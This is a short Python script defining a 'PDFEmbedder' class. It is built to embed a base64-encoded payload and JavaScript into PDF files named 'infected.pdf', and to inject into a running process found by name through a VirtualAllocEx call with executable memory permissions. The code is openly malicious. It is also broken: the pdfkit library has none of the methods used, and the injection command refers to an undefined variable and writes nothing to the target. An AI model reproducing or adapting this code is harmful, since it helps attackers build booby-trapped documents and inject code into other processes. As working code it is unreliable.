import pdfkit
import base64
import subprocess
import psutil

class PDFEmbedder:
    def __init__(self):
        self.pdf = None
        self.payload = None

    def embed(self, input_pdf_path, payload):
        self.payload = payload
        self.pdf = pdfkit.from_file(input_pdf_path)
        if self.pdf:
            self.pdf.EmbeddedFiles = [('payload', 'application/octet-stream', base64.b64encode(payload))]
            self.pdf.save('infected.pdf')

    def add_js(self, script):
        if self.pdf is None:
            raise ValueError("PDF n'a pas été chargé.")
        self.pdf.addJS(script)
        self.pdf.save('infected_with_js.pdf')

    def inject_payload(self, process_name, payload):
        pid = next((p.pid for p in psutil.process_iter(['name']) if p.info['name'].lower() == process_name.lower()), None)
        if pid:
            command = f"python -c \"import ctypes; ctypes.windll.kernel32.VirtualAllocEx({pid}, 0, len(payload), 0x3000, 0x40)\""
            subprocess.run(command, shell=True)
        else:
            raise ValueError(f"Processus {process_name} introuvable")

embedder = PDFEmbedder()
